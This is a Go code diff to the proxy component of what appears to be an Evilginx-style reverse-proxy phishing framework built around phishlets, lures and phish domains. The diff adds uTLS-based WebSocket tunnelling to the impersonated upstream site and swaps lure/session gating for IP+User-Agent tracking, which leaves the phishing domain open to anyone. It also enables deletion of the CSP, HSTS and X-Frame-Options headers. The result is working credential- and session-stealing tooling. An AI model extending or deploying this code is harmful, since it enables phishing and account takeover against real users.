@@ -19,12 +19,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"html"
-	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"net/url"
-	"os"
 	"path/filepath"
 	"regexp"
 	"sort"
@@ -37,7 +35,6 @@ import (
 	"golang.org/x/net/proxy"
 
 	"github.com/afsin-asf/goproxy-utls"
-	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 	utls "github.com/refraction-networking/utls"
@@ -83,6 +80,8 @@ type HttpProxy struct {
 	developer         bool
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
+	ipua_index        map[string]int64
+	last_index        int64
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
@@ -94,6 +93,7 @@ type ProxySession struct {
 	PhishDomain  string
 	PhishletName string
 	Index        int
+	IsWebSocket  bool
 }
 
 // set the value of the specified key in the JSON body
@@ -201,6 +201,185 @@ func createCustomUTLSTransport(spec *utls.ClientHelloSpec) http.RoundTripper {
 	}
 }
 
+// handleWebSocketRoundTrip creates a WebSocket connection to the backend using uTLS
+// This bypasses goproxy's HTTP/2 codec which can't handle protocol upgrades
+func handleWebSocketRoundTrip(req *http.Request, spec *utls.ClientHelloSpec) (*http.Response, error) {
+	log.Debug("handleWebSocketRoundTrip: Connecting to WebSocket backend %s", req.Host)
+
+	netDialer := &net.Dialer{
+		Timeout: 45 * time.Second,
+	}
+
+	// Dial TCP connection
+	conn, err := netDialer.Dial("tcp", req.Host)
+	if err != nil {
+		log.Error("TCP dial failed: %v", err)
+		return &http.Response{
+			Status:     "502 Bad Gateway",
+			StatusCode: http.StatusBadGateway,
+			Proto:      "HTTP/1.1",
+			ProtoMajor: 1,
+			ProtoMinor: 1,
+			Header:     make(http.Header),
+			Body:       ioutil.NopCloser(bytes.NewBufferString("TCP connection failed")),
+			Request:    req,
+		}, err
+	}
+	defer conn.Close()
+
+	// Extract host for TLS
+	host := req.Host
+	if h, _, err := net.SplitHostPort(host); err == nil {
+		host = h
+	}
+
+	// Establish TLS with uTLS if spec provided
+	var tlsConn net.Conn
+	if spec != nil {
+		log.Debug("handleWebSocketRoundTrip: Using custom ClientHelloSpec for TLS")
+		utlsConfig := &utls.Config{
+			ServerName:         host,
+			InsecureSkipVerify: true,
+			NextProtos:         []string{"h2", "http/1.1"},
+		}
+
+		uConn := utls.UClient(conn, utlsConfig, utls.HelloCustom)
+		if err := uConn.ApplyPreset(spec); err != nil {
+			log.Warning("failed to apply ClientHelloSpec: %v, using Chrome_Auto", err)
+			conn.Close()
+			conn, _ = netDialer.Dial("tcp", req.Host)
+			uConn = utls.UClient(conn, utlsConfig, utls.HelloChrome_Auto)
+		}
+
+		if err := uConn.Handshake(); err != nil {
+			uConn.Close()
+			log.Error("uTLS handshake failed: %v", err)
+			return &http.Response{
+				Status:     "502 Bad Gateway",
+				StatusCode: http.StatusBadGateway,
+				Proto:      "HTTP/1.1",
+				ProtoMajor: 1,
+				ProtoMinor: 1,
+				Header:     make(http.Header),
+				Body:       ioutil.NopCloser(bytes.NewBufferString("TLS handshake failed")),
+				Request:    req,
+			}, err
+		}
+		tlsConn = uConn
+	} else {
+		// Standard TLS
+		tlsConn = tls.Client(conn, &tls.Config{
+			ServerName:         host,
+			InsecureSkipVerify: true,
+		})
+		if err := tlsConn.(*tls.Conn).Handshake(); err != nil {
+			tlsConn.Close()
+			log.Error("TLS handshake failed: %v", err)
+			return &http.Response{
+				Status:     "502 Bad Gateway",
+				StatusCode: http.StatusBadGateway,
+				Proto:      "HTTP/1.1",
+				ProtoMajor: 1,
+				ProtoMinor: 1,
+				Header:     make(http.Header),
+				Body:       ioutil.NopCloser(bytes.NewBufferString("TLS handshake failed")),
+				Request:    req,
+			}, err
+		}
+	}
+
+	// Now we have a TLS connection. Upgrade to WebSocket manually.
+	// Create HTTP request for WebSocket upgrade
+	wsReq := &http.Request{
+		Method: "GET",
+		URL:    &url.URL{Path: req.URL.Path, RawQuery: req.URL.RawQuery},
+		Header: http.Header{
+			"Host":                  []string{req.Host},
+			"Upgrade":               []string{"websocket"},
+			"Connection":            []string{"Upgrade"},
+			"Sec-WebSocket-Key":     []string{"dGhlIHNhbXBsZSBub25jZQ=="}, // base64("the sample nonce")
+			"Sec-WebSocket-Version": []string{"13"},
+		},
+	}
+
+	// Copy relevant headers from original request
+	for k, v := range req.Header {
+		lowK := strings.ToLower(k)
+		if lowK != "host" && lowK != "connection" && lowK != "upgrade" &&
+			lowK != "sec-websocket-key" && lowK != "sec-websocket-version" &&
+			lowK != "sec-websocket-extensions" && lowK != "sec-websocket-protocol" {
+			wsReq.Header[k] = v
+		}
+	}
+
+	// Send HTTP request for WebSocket upgrade
+	if err := wsReq.Write(tlsConn); err != nil {
+		tlsConn.Close()
+		log.Error("Failed to send WebSocket upgrade request: %v", err)
+		return &http.Response{
+			Status:     "502 Bad Gateway",
+			StatusCode: http.StatusBadGateway,
+			Proto:      "HTTP/1.1",
+			ProtoMajor: 1,
+			ProtoMinor: 1,
+			Header:     make(http.Header),
+			Body:       ioutil.NopCloser(bytes.NewBufferString("Failed to send upgrade request")),
+			Request:    req,
+		}, err
+	}
+
+	// Read response
+	reader := bufio.NewReader(tlsConn)
+	resp, err := http.ReadResponse(reader, wsReq)
+	if err != nil {
+		tlsConn.Close()
+		log.Error("Failed to read WebSocket upgrade response: %v", err)
+		return &http.Response{
+			Status:     "502 Bad Gateway",
+			StatusCode: http.StatusBadGateway,
+			Proto:      "HTTP/1.1",
+			ProtoMajor: 1,
+			ProtoMinor: 1,
+			Header:     make(http.Header),
+			Body:       ioutil.NopCloser(bytes.NewBufferString("Failed to read upgrade response")),
+			Request:    req,
+		}, err
+	}
+
+	if resp.StatusCode != http.StatusSwitchingProtocols {
+		tlsConn.Close()
+		log.Error("WebSocket upgrade failed: got status %d", resp.StatusCode)
+		return &http.Response{
+			Status:     "502 Bad Gateway",
+			StatusCode: http.StatusBadGateway,
+			Proto:      "HTTP/1.1",
+			ProtoMajor: 1,
+			ProtoMinor: 1,
+			Header:     make(http.Header),
+			Body:       ioutil.NopCloser(bytes.NewBufferString(fmt.Sprintf("Upgrade failed: %d", resp.StatusCode))),
+			Request:    req,
+		}, fmt.Errorf("upgrade failed: %d", resp.StatusCode)
+	}
+
+	// Success - we have a WebSocket connection
+	log.Success("WebSocket backend connection established for %s", req.Host)
+
+	// Return response that includes the underlying connection
+	// Note: the actual tunneling will be handled by goproxy after this response
+	resp.Body = ioutil.NopCloser(tlsConn)
+	resp.Status = "101 Switching Protocols"
+	resp.StatusCode = http.StatusSwitchingProtocols
+	resp.Proto = "HTTP/1.1"
+	resp.ProtoMajor = 1
+	resp.ProtoMinor = 1
+	resp.Header = http.Header{
+		"Upgrade":    []string{"websocket"},
+		"Connection": []string{"Upgrade"},
+	}
+
+	return resp, nil
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -215,12 +394,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
+		ipua_index:        make(map[string]int64),
+		last_index:        0,
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
-		Handler:      p.Proxy,
+		Handler:      p,
 		ReadTimeout:  httpReadTimeout,
 		WriteTimeout: httpWriteTimeout,
 	}
@@ -262,41 +443,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				Index:        -1,
 			}
 
-			// DEBUG: Check if ClientHelloSpec is available
+			// WebSocket upgrade requests should flow through goproxy's normal CONNECT tunnel handling
+			// Don't use custom ClientHelloSpec for WebSocket - let goproxy handle it normally
+
 			if ctx.ClientHelloSpec != nil {
+				// For non-WebSocket requests with ClientHelloSpec, use custom TLS transport
 				log.Debug("DoFunc: ClientHelloSpec captured - will use for upstream TLS")
 
-				// Skip custom transport for WebSocket connections
-				// Let goproxy handle WebSocket natively
-				isWebSocket := strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
-					strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
-
-				if !isWebSocket {
-					// Override RoundTripper to use ClientHelloSpec for upstream TLS
-					ctx.RoundTripper = goproxy.RoundTripperFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
-						// Create custom TLS transport with ClientHelloSpec
-						tr := createCustomUTLSTransport(ctx.ClientHelloSpec)
-						return tr.RoundTrip(req)
-					})
-					log.Debug("DoFunc: Custom transport set for non-WebSocket request")
-				} else {
-					log.Debug("DoFunc: WebSocket request detected - using default goproxy routing")
-				}
-			} else {
-				log.Debug("DoFunc: ClientHelloSpec is NIL - no fingerprint available")
+				// Override RoundTripper to use ClientHelloSpec for upstream TLS
+				ctx.RoundTripper = goproxy.RoundTripperFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
+					// Create custom TLS transport with ClientHelloSpec
+					tr := createCustomUTLSTransport(ctx.ClientHelloSpec)
+					return tr.RoundTrip(req)
+				})
+				log.Debug("DoFunc: Custom TLS transport set")
 			}
 
-			if req.ProtoMajor == 2 {
+			if req.ProtoMajor == 2 && !ps.IsWebSocket {
 				// HTTP/2'de Host header yerine :authority kullanılır
 				// Go bunu otomatik yapar, ama connection-specific header'ları temizle
+				// But don't remove Upgrade for WebSocket - we handle that separately
 				req.Header.Del("Connection")
 				req.Header.Del("Keep-Alive")
 				req.Header.Del("Transfer-Encoding") // chunked HTTP/2'de yok
-				req.Header.Del("Upgrade")
 			}
 
 			ctx.UserData = ps
-			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -336,7 +508,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
-			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
@@ -426,286 +597,124 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 					ps.PhishletName = pl_name
 				}
-				session_cookie := getSessionCookieName(pl_name, p.cookieName)
-
 				ps.PhishDomain = phishDomain
-				req_ok := false
-				// handle session
-				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-					if err == nil {
-						log.Debug("triggered lure for path '%s'", req_path)
-					}
 
-					var create_session bool = true
-					var ok bool = false
-					sc, err := req.Cookie(session_cookie)
-					if err == nil {
-						ps.Index, ok = p.sids[sc.Value]
-						if ok {
-							create_session = false
-							ps.SessionId = sc.Value
-							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-						} else {
-							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-						}
-					} else {
-						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
-							// not a lure path and IP is whitelisted
+				// IP+UA based tracking - no session validation required
+				// Base domain is fully accessible - browser handles auth via cookies
+				idx := p.getOrCreateIPUAIndex(remote_addr, req.Header.Get("User-Agent"))
+				ps.Index = int(idx)
+				ipua_key := p.getIPUAKey(remote_addr, req.Header.Get("User-Agent"))
+				ps.SessionId = ipua_key
+				p.whitelistIP(remote_addr, ipua_key, pl_name)
 
-							// TODO: allow only retrieval of static content, without setting session ID
-
-							create_session = false
-							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
-						}
-					}
-
-					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
-						// session cookie not found
-						if !p.cfg.IsSiteHidden(pl_name) {
-							if l != nil {
-								// check if lure is not paused
-								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
-									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
-									return p.blockRequest(req)
-								}
-
-								// check if lure user-agent filter is triggered
-								if len(l.UserAgentFilter) > 0 {
-									re, err := regexp.Compile(l.UserAgentFilter)
-									if err == nil {
-										if !re.MatchString(req.UserAgent()) {
-											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
-											if p.cfg.GetBlacklistMode() == "unauth" {
-												if !p.bl.IsWhitelisted(from_ip) {
-													err := p.bl.AddIP(from_ip)
-													if p.bl.IsVerbose() {
-														if err != nil {
-															log.Error("blacklist: %s", err)
-														} else {
-															log.Warning("blacklisted ip address: %s", from_ip)
-														}
-													}
-												}
-											}
-											return p.blockRequest(req)
-										}
-									} else {
-										log.Error("lures: user-agent filter regexp is invalid: %v", err)
-									}
-								}
-
-								session, err := NewSession(pl.Name)
+				// Session-based redirect handling disabled - domain fully accessible without sessions
+				/*
+					if ps.SessionId != "" {
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 								if err == nil {
-									// set params from url arguments
-									p.extractParams(session, req.URL)
+									// show html redirector if it is set for the current lure
+									if l.Redirector != "" {
+										if !p.isForwarderUrl(req.URL) {
+											if s.RedirectorName == "" {
+												s.RedirectorName = l.Redirector
+												s.LureDirPath = req_path
+											}
 
-									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-										if trackParam, ok := session.Params["o"]; ok {
-											if trackParam == "track" {
-												// gophish email tracker image
-												rid, ok := session.Params["rid"]
-												if ok && rid != "" {
-													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
-													if err != nil {
-														log.Error("gophish: %s", err)
+											t_dir := l.Redirector
+											if !filepath.IsAbs(t_dir) {
+												redirectors_dir := p.cfg.GetRedirectorsDir()
+												t_dir = filepath.Join(redirectors_dir, t_dir)
+											}
+
+											index_path1 := filepath.Join(t_dir, "index.html")
+											index_path2 := filepath.Join(t_dir, "index.htm")
+											index_found := ""
+											if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
+												index_found = index_path1
+											} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
+												index_found = index_path2
+											}
+
+											if _, err := os.Stat(index_found); !os.IsNotExist(err) {
+												html, err := ioutil.ReadFile(index_found)
+												if err == nil {
+
+													html = p.injectOgHeaders(l, html)
+
+													body := string(html)
+													body = p.replaceHtmlParams(body, lure_url, &s.Params)
+
+													resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+													if resp != nil {
+														return req, resp
+													} else {
+														log.Error("lure: failed to create html redirector response")
 													}
-													return p.trackerImage(req)
+												} else {
+													log.Error("lure: failed to read redirector file: %s", err)
+												}
+
+											} else {
+												log.Error("lure: redirector file does not exist: %s", index_found)
+											}
+										}
+									}
+								} else if s.RedirectorName != "" {
+									// session has already triggered a lure redirector - see if there are any files requested by the redirector
+
+									rel_parts := []string{}
+									req_path_parts := strings.Split(req_path, "/")
+									lure_path_parts := strings.Split(s.LureDirPath, "/")
+
+									for n, dname := range req_path_parts {
+										if len(dname) > 0 {
+											path_add := true
+											if n < len(lure_path_parts) {
+												//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
+												if req_path_parts[n] == lure_path_parts[n] {
+													path_add = false
 												}
 											}
-										}
-									}
-
-									sid := p.last_sid
-									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
-									p.sessions[session.Id] = session
-									p.sids[session.Id] = sid
-
-									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-										rid, ok := session.Params["rid"]
-										if ok && rid != "" {
-											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
-											if err != nil {
-												log.Error("gophish: %s", err)
+											if path_add {
+												rel_parts = append(rel_parts, req_path_parts[n])
 											}
 										}
+
 									}
+									rel_path := filepath.Join(rel_parts...)
+									//log.Debug("rel_path: %s", rel_path)
 
-									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
-									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
-										log.Error("database: %v", err)
-									}
-
-									session.RemoteAddr = remote_addr
-									session.UserAgent = req.Header.Get("User-Agent")
-									session.RedirectURL = pl.RedirectUrl
-									if l.RedirectUrl != "" {
-										session.RedirectURL = l.RedirectUrl
-									}
-									if session.RedirectURL != "" {
-										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-									}
-									session.PhishLure = l
-									log.Debug("redirect URL (lure): %s", session.RedirectURL)
-
-									ps.SessionId = session.Id
-									ps.Created = true
-									ps.Index = sid
-									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-
-									req_ok = true
-								}
-							} else {
-								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
-								if p.cfg.GetBlacklistMode() == "unauth" {
-									if !p.bl.IsWhitelisted(from_ip) {
-										err := p.bl.AddIP(from_ip)
-										if p.bl.IsVerbose() {
-											if err != nil {
-												log.Error("blacklist: %s", err)
-											} else {
-												log.Warning("blacklisted ip address: %s", from_ip)
-											}
-										}
-									}
-								}
-								return p.blockRequest(req)
-							}
-						} else {
-							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-						}
-					}
-				}
-
-				// redirect for unauthorized requests
-				if ps.SessionId == "" && p.handleSession(req.Host) {
-					if !req_ok {
-						return p.blockRequest(req)
-					}
-				}
-				// req.Header.Set(p.getHomeDir(), o_host)
-
-				if ps.SessionId != "" {
-					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-						if err == nil {
-							// show html redirector if it is set for the current lure
-							if l.Redirector != "" {
-								if !p.isForwarderUrl(req.URL) {
-									if s.RedirectorName == "" {
-										s.RedirectorName = l.Redirector
-										s.LureDirPath = req_path
-									}
-
-									t_dir := l.Redirector
+									t_dir := s.RedirectorName
 									if !filepath.IsAbs(t_dir) {
 										redirectors_dir := p.cfg.GetRedirectorsDir()
 										t_dir = filepath.Join(redirectors_dir, t_dir)
 									}
 
-									index_path1 := filepath.Join(t_dir, "index.html")
-									index_path2 := filepath.Join(t_dir, "index.htm")
-									index_found := ""
-									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
-										index_found = index_path1
-									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
-										index_found = index_path2
-									}
-
-									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+									path := filepath.Join(t_dir, rel_path)
+									if _, err := os.Stat(path); !os.IsNotExist(err) {
+										fdata, err := ioutil.ReadFile(path)
 										if err == nil {
-
-											html = p.injectOgHeaders(l, html)
-
-											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
-
-											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+											//log.Debug("ext: %s", filepath.Ext(req_path))
+											mime_type := getContentType(req_path, fdata)
+											//log.Debug("mime_type: %s", mime_type)
+											resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
 											if resp != nil {
+												resp.Body = io.NopCloser(bytes.NewReader(fdata))
 												return req, resp
 											} else {
-												log.Error("lure: failed to create html redirector response")
+												log.Error("lure: failed to create redirector data file response")
 											}
 										} else {
-											log.Error("lure: failed to read redirector file: %s", err)
+											log.Error("lure: failed to read redirector data file: %s", err)
 										}
-
 									} else {
-										log.Error("lure: redirector file does not exist: %s", index_found)
+										//log.Warning("lure: template file does not exist: %s", path)
 									}
 								}
-							}
-						} else if s.RedirectorName != "" {
-							// session has already triggered a lure redirector - see if there are any files requested by the redirector
-
-							rel_parts := []string{}
-							req_path_parts := strings.Split(req_path, "/")
-							lure_path_parts := strings.Split(s.LureDirPath, "/")
-
-							for n, dname := range req_path_parts {
-								if len(dname) > 0 {
-									path_add := true
-									if n < len(lure_path_parts) {
-										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
-										if req_path_parts[n] == lure_path_parts[n] {
-											path_add = false
-										}
-									}
-									if path_add {
-										rel_parts = append(rel_parts, req_path_parts[n])
-									}
-								}
-
-							}
-							rel_path := filepath.Join(rel_parts...)
-							//log.Debug("rel_path: %s", rel_path)
-
-							t_dir := s.RedirectorName
-							if !filepath.IsAbs(t_dir) {
-								redirectors_dir := p.cfg.GetRedirectorsDir()
-								t_dir = filepath.Join(redirectors_dir, t_dir)
-							}
-
-							path := filepath.Join(t_dir, rel_path)
-							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
-								if err == nil {
-									//log.Debug("ext: %s", filepath.Ext(req_path))
-									mime_type := getContentType(req_path, fdata)
-									//log.Debug("mime_type: %s", mime_type)
-									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-									if resp != nil {
-										resp.Body = io.NopCloser(bytes.NewReader(fdata))
-										return req, resp
-									} else {
-										log.Error("lure: failed to create redirector data file response")
-									}
-								} else {
-									log.Error("lure: failed to read redirector data file: %s", err)
-								}
-							} else {
-								//log.Warning("lure: template file does not exist: %s", path)
 							}
 						}
-					}
-				}
-
+				*/
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
@@ -1088,17 +1097,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" && !isCloudflareRequest {
-					s, ok := p.sessions[ps.SessionId]
-					if ok && !s.IsDone {
-						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
-								s.Finish(true)
-								break
+				// Session-based auth finishing disabled - browser handles auth via cookies
+				/*
+					if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" && !isCloudflareRequest {
+						s, ok := p.sessions[ps.SessionId]
+						if ok && !s.IsDone {
+							for _, au := range pl.authUrls {
+								if au.MatchString(req.URL.Path) {
+									s.Finish(true)
+									break
+								}
 							}
 						}
 					}
-				}
+				*/
 			}
 
 			return req, nil
@@ -1124,24 +1136,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
-			// var rm_headers = []string{
-			// 	"Content-Security-Policy",
-			// 	"Content-Security-Policy-Report-Only",
-			// 	"Strict-Transport-Security",
-			// 	"X-XSS-Protection",
-			// 	"X-Content-Type-Options",
-			// 	"X-Frame-Options",
-			// }
-			// for _, hdr := range rm_headers {
-			// 	resp.Header.Del(hdr)
-			// }
-
-			redirect_set := false
-			if s, ok := p.sessions[ps.SessionId]; ok {
-				if s.RedirectURL != "" {
-					redirect_set = true
-				}
+			var rm_headers = []string{
+				"Content-Security-Policy",
+				"Content-Security-Policy-Report-Only",
+				"Strict-Transport-Security",
+				"X-XSS-Protection",
+				"X-Content-Type-Options",
+				"X-Frame-Options",
 			}
+			for _, hdr := range rm_headers {
+				resp.Header.Del(hdr)
+			}
+
+			// Session-based redirect disabled
+			/*
+				redirect_set := false
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					if s.RedirectURL != "" {
+						redirect_set = true
+					}
+				}
+			*/
+			redirect_set := false
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
@@ -1827,10 +1843,10 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 						log.Debug("TLSConfigFromCA: found original domain %s for phishing domain %s", phish_host, hostname)
 						break
 					}
-					// Check if hostname matches the upstream domain (for MITM certificate generation)
+					// Check if hostname matches the upstream domain (direct backend connection)
 					if hostname == originalHost {
-						phish_host = originalHost
-						log.Debug("TLSConfigFromCA: found upstream domain %s, will use it for certificate", phish_host)
+						phish_host = ""
+						log.Debug("TLSConfigFromCA: hostname is upstream domain %s, generating generic certificate", hostname)
 						break
 					}
 				}
@@ -1942,6 +1958,19 @@ func (p *HttpProxy) httpsWorker() {
 			p.Proxy.ServeHTTP(resp, req)
 		}(c)
 	}
+}
+
+// ServeHTTP is the main HTTP handler that intercepts WebSocket requests before goproxy
+func (p *HttpProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
+	// Check if this is a WebSocket upgrade request
+	if isWebSocketRequest(req) {
+		log.Debug("ServeHTTP: WebSocket request intercepted for %s%s", req.Host, req.URL.Path)
+		p.handleWebSocketProxy(w, req)
+		return
+	}
+
+	// For non-WebSocket requests, use the standard goproxy handler
+	p.Proxy.ServeHTTP(w, req)
 }
 
 func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
@@ -2156,6 +2185,26 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
 	return nil
+}
+
+// getIPUAKey returns a unique key combining IP address and User-Agent
+func (p *HttpProxy) getIPUAKey(ip string, userAgent string) string {
+	return ip + "||" + userAgent
+}
+
+// getOrCreateIPUAIndex returns the logging index for an IP+UserAgent combo
+// Creates and assigns a new index if this is the first request from this combo
+func (p *HttpProxy) getOrCreateIPUAIndex(ip string, userAgent string) int64 {
+	key := p.getIPUAKey(ip, userAgent)
+
+	if idx, exists := p.ipua_index[key]; exists {
+		return idx
+	}
+
+	// New IP+UA combo - assign next index
+	p.last_index++
+	p.ipua_index[key] = p.last_index
+	return p.last_index
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
